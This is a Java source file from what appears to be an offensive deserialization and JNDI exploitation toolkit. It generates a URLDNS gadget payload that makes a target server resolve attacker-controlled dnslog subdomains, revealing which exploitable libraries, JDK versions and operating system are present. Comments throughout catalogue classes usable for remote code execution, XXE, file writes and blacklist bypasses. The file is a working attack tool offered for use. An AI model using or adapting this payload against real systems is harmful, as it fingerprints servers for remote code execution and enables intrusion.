package sonomon.jndi.deser.gadgets;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;

import sonomon.jndi.factory.FactoryUtils;
import javassist.ClassPool;
import javassist.CtClass;


public class Urldns implements SerializeObject{
	static List<Object> list = new LinkedList<Object>();
	static String dnslog;
	static String[] defaultclass = {
			"CommonsCollections13567",
				"CommonsCollections24",
				"CommonsBeanutils2",
				"C3P0",
				"AspectJWeaver",
				"bsh",
				"Groovy",
				"Becl",
				"DefiningClassLoader",
				"Jdk7u21",
				"JRE8u20",
				"ROME",
				"Fastjson1",
				"Jackson",
				"SpringAOP",
				"winlinux",
				"jdk17_22",
				"jdk9_22",
				"jdk6_8",
				"jdk6_11",
				"jdk9_10",
  				};
	static String[] jndidefaultclass = {
			//"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",//知名getter=classloader,jdk默认就有
			
			"org.apache.naming.factory.BeanFactory",//最经典的ObjectFactory,有它+符合条件的tomcat意味着可以执行单String方法
			"org.apache.catalina.filters.CsrfPreventionFilter$NonceCache",//tomcat9.0.63/8.5.79高版本才有的类,有这个代表无法再用BeanFactory的forceString
			//tomcat<7.0.61/8.0.20没有forceString特性,tomcat-catalina没有独立类
			"javax.el.ELProcessor",//和BeanFactory最经典的配合,较低版本的tomcat没有
			//"groovy.lang.GroovyShell",//有Groovy所以可以省略了
			//"groovy.lang.GroovyClassLoader",//有Groovy所以可以省略了
			"org.yaml.snakeyaml.Yaml",//知名YAML序列化,可以跟BeanFactory配合
			"com.thoughtworks.xstream.XStream",//知名XML序列化,可以跟BeanFactory配合
			//"org.xmlpull.v1.XmlPullParserException",//XStream依赖
			//"org.xmlpull.mxp1.MXParser",//XStream依赖
			"org.mvel2.sh.ShellSession",//mvel语法,可以跟BeanFactory配合
			//"com.sun.glass.utils.NativeLibLoader",//加载dll或者so,jdk默认就有

			"org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory",//高版本tomcat和低版本tomcat没有forceString时的替代类,和BeanFactory一样只能调setter,但BeanFactory会检测setter所对应的属性
			"org.apache.commons.configuration.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
			"org.apache.commons.configuration2.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
			"org.apache.groovy.util.SystemUtil",//groovy >= 3.0才有,配合GenericNamingResourcesFactory可以篡改jdk环境变量
			"org.apache.batik.swing.JSVGCanvas",//远程加载svg造成XSS,XXE,RCE
//			"org.w3c.dom.svg.SVGDocument",//batik依赖
//			"org.w3c.dom.smil.ElementTimeControl",
//			"org.w3c.css.sac.Parser",
			
			"org.apache.catalina.users.MemoryUserDatabaseFactory",//配合UserDatabase可以XXE,写文件
			"org.apache.catalina.UserDatabase",//配合MemoryUserDatabaseFactory可以XXE,写文件
			
			"org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",//以下均为DataSourceFactory,可以造成jdbc
			"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
			"org.apache.commons.dbcp.BasicDataSourceFactory",
			//"org.apache.commons.pool.KeyedObjectPoolFactory",//commons-dbcp1依赖
			"org.apache.commons.dbcp2.BasicDataSourceFactory",
			//"org.apache.commons.pool2.PooledObjectFactory",//commons-dbcp2依赖
			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
			//"org.apache.juli.logging.LogFactory",//tomcat-jdbc依赖
			"com.alibaba.druid.pool.DruidDataSourceFactory",
			"com.zaxxer.hikari.HikariJNDIFactory",
			//"org.slf4j.LoggerFactory",//HikariCP依赖
			"org.h2.Driver",//h2 jdbc,可以RCE
			"org.postgresql.Driver",//postgresql,可以远程加载XML执行SPEL,可以写文件
			"org.springframework.context.support.ClassPathXmlApplicationContext",//postgresql RCE依赖spring环境
			"com.mysql.jdbc.Driver",//mysql,可以二次反序列化,可以读文件,可以XXE
			"com.mysql.cj.jdbc.Driver",
			"com.mysql.fabric.jdbc.FabricMySQLDriver",
			"oracle.jdbc.driver.OracleDriver",//oracle,可以带出机器用户名
			"com.ibm.db2.jcc.DB2Driver",//db2,可以写文件
			"COM.ibm.db2.jcc.DB2Driver",//db2,有些版本是大写
			"org.sqlite.JDBC",//sqlite,可以RCE
			"org.apache.derby.jdbc.EmbeddedDriver",//derby,可以RCE
			
			"com.ibm.ws.webservices.engine.client.ServiceFactory",//WebSphere的ObjectFactory,可以远程加载jar,很少用到
			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",

			};
	static String[] othersclass = {
			
			"org.apache.xpath.objects.XString",//XString代替品,依赖xalan
			"org.apache.commons.configuration.ConfigurationKey",//XString代替品,依赖commons-configuration-1.x
			"org.apache.axis.types.HexBinary",//XString代替品,依赖axis.jar commons-discovery.jar
			//"org.apache.axis.types.NormalizedString",//同上,省略
			//"groovy.lang.Gstring",//已经有Groovy了可省略
			"com.google.common.collect.UsingToStringOrdering",//Guava,打toString()
			"org.eclipse.jetty.util.StringMap",//jetty-util-8.1.22.v20160922.jar,打toString()
			
			
			"cn.hutool.db.ds.pooled.PooledDSFactory",//hutool的getConnection类,还有很多其他省略
			"oracle.ucp.jdbc.PoolDataSourceImpl",//反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类,weblogic依赖
//			"com.mchange.v2.c3p0.DriverManagerDataSource",//有C3P0所以可以省略了
//			"com.alibaba.druid.pool.xa.DruidXADataSource",//有com.alibaba.druid.pool.DruidDataSourceFactory所以可以省略了
			"org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl",//hibernate-core-4.x,比较低版本才有的类
			
//			"org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS",//getter转jdbc,因为有BasicDataSourceFactory所以可以省略
//			"org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS",
//			"org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS",
//			"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
//			"org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource",//getter转ldap,因为有BasicDataSourceFactory所以可以省略
//			"org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource",
//			"org.apache.commons.dbcp.datasources.SharedPoolDataSource",
//			"org.apache.commons.dbcp2.datasources.SharedPoolDataSource",
//			"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource",//getter转ldap,因为有BasicDataSourceFactory所以可以省略
//			"org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource",
//			"org.apache.commons.dbcp.datasources.PerUserPoolDataSource",
//			"org.apache.commons.dbcp2.datasources.PerUserPoolDataSource",
			
			"org.apache.arrow.vector.util.JsonStringArrayList",//jackson链中可以替代com.fasterxml.jackson.databind.node.POJONode,冷门项目arrow-vector,帆软有引用
//			"org.apache.arrow.vector.util.JsonStringHashMap",//同上,同一个包里所以可省略
			"org.apache.drill.exec.util.JsonStringArrayList",//jackson链中可以替代POJONode,冷门项目apache-drill
//			"org.apache.drill.exec.util.JsonStringHashMap",//同上,同一个包里所以可省略
			"com.fr.json.JSONArray",//jackson链中可以替代POJONode,帆软独有类,帆软环境中存在非常多类似包名不同的类
			"org.apache.hadoop.shaded.com.fasterxml.jackson.databind.node.POJONode", //jackson链中可以替代POJONode,hadoop独有类
			"com.bes.org.mozilla.javascript.NativeError",//MozillaRhino链中的替代类,宝兰德独有类
			"com.jd.fastjson.JSONArray",// fastjson替代类,京东sdk独有类
			"com.huawei.shade.com.alibaba.fastjson.JSONArray",// fastjson替代类,华为sdk独有类
			"com.alibaba.tuna.fastjson.JSONArray",// fastjson替代类,支付宝sdk独有类
			"com.gexin.fastjson.JSONArray",// fastjson替代类
			
			"org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding",// xbean-naming链,比较冷门
			"com.vaadin.data.util.PropertysetItem",//Vaadin链,比较冷门

			};
    public static  void setlist(String clazzName) throws Exception{
    	switch (clazzName) {
		case "CommonsCollections13567":
	    	//CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
	    	HashMap<URL, Class<?>> cc31or321 = getURLDNSgadget("http://cc31or321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
	    	HashMap<URL, Class<?>> cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.functors.FunctorUtils$1");
	  		list.add(cc31or321);
	  		list.add(cc322);
			break;
		case "CommonsCollections24":
	    	//CommonsCollections2/4链,需要4-4.0版本
			HashMap<URL, Class<?>> cc40 = getURLDNSgadget("http://cc40."+dnslog,  "org.apache.commons.collections4.functors.ChainedTransformer");
			HashMap<URL, Class<?>> cc41 = getURLDNSgadget("http://cc41."+dnslog,  "org.apache.commons.collections4.FluentIterable");
	  		list.add(cc40);
	  		list.add(cc41);
			break;
		case "CommonsBeanutils2":
	    	//CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
			HashMap<URL, Class<?>> cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
			HashMap<URL, Class<?>> cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
			HashMap<URL, Class<?>> cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
	    	list.add(cb17);
	  		list.add(cb18x);
	  		list.add(cb19x);
			break;
		case "C3P0":
	    	//c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为-2440162180985815128
			HashMap<URL, Class<?>> c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
			HashMap<URL, Class<?>> c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
	  		list.add(c3p092x);
	  		list.add(c3p095x);
			break;
		case "AspectJWeaver":
	    	//AspectJWeaver,需要cc31
			//2025年新增SpringAOP1链,需要SpringAOP和AspectJWeaver
			HashMap<URL, Class<?>> ajw = getURLDNSgadget("http://ajw."+dnslog, "org.aspectj.weaver.tools.cache.SimpleCache");
	  		list.add(ajw);
			break;
		case "bsh":
	  		//bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
			HashMap<URL, Class<?>> bsh20b4 = getURLDNSgadget("http://bsh20b4."+dnslog, "bsh.CollectionManager$1");
			HashMap<URL, Class<?>> bsh20b5 = getURLDNSgadget("http://bsh20b5."+dnslog, "bsh.engine.BshScriptEngine");
			HashMap<URL, Class<?>> bsh20b6 = getURLDNSgadget("http://bsh20b6."+dnslog, "bsh.collection.CollectionIterator$1");
	  		list.add(bsh20b4);
	  		list.add(bsh20b5);
	  		list.add(bsh20b6);
			break;
		case "Groovy":
	  		//Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
			HashMap<URL, Class<?>> groovy1702311 = getURLDNSgadget("http://groovy1702311."+dnslog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
			HashMap<URL, Class<?>> groovy24x = getURLDNSgadget("http://groovy24x."+dnslog, "groovy.lang.Tuple2");
			HashMap<URL, Class<?>> groovy244 = getURLDNSgadget("http://groovy244."+dnslog, "org.codehaus.groovy.runtime.dgm$1170");
	  		list.add(groovy1702311);
	  		list.add(groovy24x);
	  		list.add(groovy244);
			break;
		case "Becl":
	  		//Becl,JDK<8u251
			HashMap<URL, Class<?>> becl = getURLDNSgadget("http://becl."+dnslog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
	  		list.add(becl);
			break;
		case "DefiningClassLoader":
	  		//js/rhino,有这个说明可能存在MozillaRhino链
			HashMap<URL, Class<?>> js = getURLDNSgadget("http://DefiningClassLoader."+dnslog, "org.mozilla.javascript.DefiningClassLoader");
	  		list.add(js);
			break;
		case "MozillaRhino":
	  		//ContinuationPending在1.7.15-1.7R2都有
	  		//ScriptableObject$GetterSlot在1.7.13-1.7R1都有
	  		//这两个类同时存在说明处于MozillaRhino1链范围
			HashMap<URL, Class<?>> rhino1715_17R2_max = getURLDNSgadget("http://rhino1715_17R2_max."+dnslog, "org.mozilla.javascript.ContinuationPending");
			HashMap<URL, Class<?>> rhino1713_17R1_min = getURLDNSgadget("http://rhino1713_17R1_min."+dnslog, "org.mozilla.javascript.ScriptableObject$GetterSlot");
	  		list.add(rhino1715_17R2_max);
	  		list.add(rhino1713_17R1_min);
	  		
	  		//Hashtable在1.7.15-1.7.11-RC1都有
	  		//有这个类说明要使用rhino-1.7.13/1.7.12/1.7.11/1.7.11-RC2/1.7.11-RC1生成MozillaRhino1链
	  		HashMap<URL, Class<?>> rhino1715_1711RC1 = getURLDNSgadget("http://rhino1715_1711RC1."+dnslog, "org.mozilla.javascript.Hashtable");
	  		list.add(rhino1715_1711RC1);
	  		
	  		//EmbeddedSlotMap在1.7.15-1.7.8-RC1都有
	  		//有这个类说明要使用rhino-1.7.10/1.7.9/1.7.8/1.7.8-RC1或者更上层生成MozillaRhino1链
	  		HashMap<URL, Class<?>> rhino1715_178RC1 = getURLDNSgadget("http://rhino1715_178RC1."+dnslog, "org.mozilla.javascript.EmbeddedSlotMap");
	  		list.add(rhino1715_178RC1);
	  		
	  		//ES6Iterator在1.7.15-1.7.7.2都有
	  		//有这个类说明要使用rhino-1.7.7.2或者更上层生成MozillaRhino1链
	  		HashMap<URL, Class<?>> rhino1715_1772 = getURLDNSgadget("http://rhino1715_1772."+dnslog, "org.mozilla.javascript.ES6Iterator");
	  		list.add(rhino1715_1772);
	  		
	  		//StackStyle在1.7.15-1.7R4都有
	  		//有这个类说明要使用rhino-1.7R5/1.7R4或者更上层生成MozillaRhino1链
	  		HashMap<URL, Class<?>> rhino1715_17R4 = getURLDNSgadget("http://rhino1715_17R4."+dnslog, "org.mozilla.javascript.ConsString");
	  		list.add(rhino1715_17R4);
	  		
	  		//FunctionNode在js-1.7R2或者更低的版本都有
	  		//有这个类说明要使用js-1.7R2生成MozillaRhino1链
	  		HashMap<URL, Class<?>> rhinojs17R2_js1x = getURLDNSgadget("http://rhinojs17R2_js1x."+dnslog, "org.mozilla.javascript.FunctionNode");
	  		list.add(rhinojs17R2_js1x);

			break;
		case "Jdk7u21":
	  		//JDK<=7u21
			HashMap<URL, Class<?>> Jdk7u21 = getURLDNSgadget("http://Jdk7u21."+dnslog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
	  		list.add(Jdk7u21);
			break;
		case "JRE8u20":
	  		//7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
			HashMap<URL, Class<?>> JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
	  		list.add(JRE8u20);
			break;
		case "ROME":
			//rome <= 1.11.1
			HashMap<URL, Class<?>> rome1000 = getURLDNSgadget("http://rome1000."+dnslog, "com.sun.syndication.feed.impl.ToStringBean");
			HashMap<URL, Class<?>> rome1111 = getURLDNSgadget("http://rome1111."+dnslog, "com.rometools.rome.feed.impl.ObjectBean");
	  		list.add(rome1000);
	  		list.add(rome1111);
			break;
		case "Fastjson1":
			//fastjson<=1.2.48存在一个链,>1.2.48也可以打需要用hashMap绕过checkAutoType
			//此链依赖BadAttributeValueExpException,在JDK1.7中无法触发toString,此时需要用springAOP或者其他toString绕过
			HashMap<URL, Class<?>> fastjson = getURLDNSgadget("http://fastjson."+dnslog, "com.alibaba.fastjson.JSONArray");
	  		list.add(fastjson);
			break;
		case "Fastjson2":
			//fastjson2<=2.0.26存在和fastjson1类似的链
			HashMap<URL, Class<?>> fastjson2026 = getURLDNSgadget("http://fastjson2026."+dnslog, "com.alibaba.fastjson2.reader.ObjectReaderImplAtomicInteger");
	  		//fastjson2>2.0.26存在黑名单,存在绕过,也可以使用其他getter
			HashMap<URL, Class<?>> fastjson2 = getURLDNSgadget("http://fastjson2."+dnslog, "com.alibaba.fastjson2.JSONArray");
			list.add(fastjson2026);
			list.add(fastjson2);
			break;
		case "Jackson":
			//jackson-databind>=2.10.0存在一个链
			//此链实战中有50%概率触发getStylesheetDOM导致不成功,因此需要org.springframework.aop.framework.JdkDynamicAopProxy封装,这个类的jar包和springAOP一样
			HashMap<URL, Class<?>> jackson = getURLDNSgadget("http://jackson2100."+dnslog, "com.fasterxml.jackson.databind.node.NodeSerialization");
	  		list.add(jackson);
			break;
		case "SpringAOP":
			//fastjon/jackson两个链触发toString的变种,都需要springAOP
			//2025年新增SpringAOP1链,需要SpringAOP和AspectJWeaver
			HashMap<URL, Class<?>> springAOP = getURLDNSgadget("http://SpringAOP."+dnslog, "org.springframework.aop.target.HotSwappableTargetSource");
	  		list.add(springAOP);
			break;
		case "winlinux":
	  		//windows/linux版本判断
			HashMap<URL, Class<?>> linux = getURLDNSgadget("http://linux."+dnslog, "sun.awt.X11.AwtGraphicsConfigData");
			HashMap<URL, Class<?>> windows = getURLDNSgadget("http://windows."+dnslog, "sun.awt.windows.WButtonPeer");
	  		list.add(linux);
	  		list.add(windows);
			break;
		case "jdk17_22":
			HashMap<URL, Class<?>> jdk17_22 = getURLDNSgadget("http://jdk17_22."+dnslog, "jdk.internal.util.random.RandomSupport");
	  		list.add(jdk17_22);
			break;
		case "jdk9_22":
			HashMap<URL, Class<?>> jdk9_22 = getURLDNSgadget("http://jdk9_22."+dnslog, "jdk.internal.misc.Unsafe");
	  		list.add(jdk9_22);
			break;
		case "jdk6_8":
			HashMap<URL, Class<?>> jdk6_8 = getURLDNSgadget("http://jdk6_8."+dnslog, "sun.misc.BASE64Decoder");
	  		list.add(jdk6_8);
			break;
		case "jdk6_11":
			HashMap<URL, Class<?>> jdk6_11 = getURLDNSgadget("http://jdk6_11."+dnslog, "com.sun.awt.SecurityWarning");
	  		list.add(jdk6_11);
			break;
		case "jdk9_10":
			HashMap<URL, Class<?>> jdk9_10 = getURLDNSgadget("http://jdk9_10."+dnslog, "jdk.incubator.http.HttpClient");
	  		list.add(jdk9_10);
			break;
		case "all":
			for (int i = 0; i < defaultclass.length; i++) {
				setlist(defaultclass[i]);
			}
			break;
		case "jndiall":
			for (int i = 0; i < jndidefaultclass.length; i++) {
				setlist(jndidefaultclass[i]);
			}
			break;
		case "others":
			for (int i = 0; i < othersclass.length; i++) {
				setlist(othersclass[i]);
			}
			break;
		default:
			HashMap<URL, Class<?>> hm = getURLDNSgadget("http://"+clazzName.replace(".", "_").replace("$", "_")+"."+dnslog, clazzName);
			list.add(hm);
			break;
		}
    }
    
    
    
    
    
    
    
    
    
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
    public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
    	dnslog = payload;
    	String clazzs = "all|jndiall|others";
  		List<String> arraylistclazz = Arrays.asList(clazzs.split("\\|"));
  		for (Iterator<String> iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  			String clazz = iterator.next();
  			setlist(clazz);
  		}
  		return list;
    }
    
    
    


    public static HashMap<URL, Class<?>> getURLDNSgadget(String urls, String clazzName) throws Exception{
    	HashMap<URL, Class<?>> hashMap = new HashMap<URL, Class<?>>();
  		URL url = new URL(urls);
  		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
  		f.setAccessible(true);
  		f.set(url, 0);
  		Class<?> clazz = null;
  		try {
  			clazz = makeClass(clazzName);
		} catch (Exception e) {
			clazz = Class.forName(clazzName);
		}
  		hashMap.put(url, clazz);
  		f.set(url, -1);
        return hashMap;
    }
    
    public static Class<?> makeClass(String clazzName) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        ctClass.getClassFile().setMajorVersion(50);//jdk1.6  52=jdk1.8
        Class<?> clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

}
